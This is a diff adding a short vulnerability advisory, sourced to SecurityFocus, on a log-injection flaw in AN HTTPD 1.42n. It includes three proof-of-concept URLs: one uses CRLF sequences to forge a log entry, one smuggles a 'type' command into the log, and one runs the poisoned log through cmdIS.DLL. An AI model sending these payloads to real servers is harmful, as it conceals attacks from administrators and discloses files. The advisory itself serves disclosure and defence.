@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/13069/info
+
+AN HTTPD is affected by a vulnerability that may allow remote attacker to inject arbitrary content in to the log file. This issue arises due to a failure of input validation.
+
+Corruption of logs may result in concealing attacks and/or misleading an administrator.
+
+This issue can also be exploited to carry out other attacks such as the execution of certain BAT file commands. This can result in the disclosure of source code and text files.
+
+This issue may also aid in the exploitation of the vulnerability described in BID 13066 (AN HTTPD CMDIS.DLL Remote Buffer Overflow Vulnerability).
+
+AN HTTPD 1.42n is reported vulnerable, however, it is possible that other versions are affected as well. 
+
+http://www.example.com/a%20HTTP/1.0"%20200%202048%0d%0a255.255.255.255%20-%20-%20[06/Mar/2005%3a22%3a31%3a11%20+0800]%20"GET%20/hack
+
+http://www.example.com/%0d%0atype%20cgi-bin%5Ctest.bat
+
+To parse a command through 'cmdIS.DLL':
+http://www.example.com/scripts/cmdIS.dll/httpd.log 
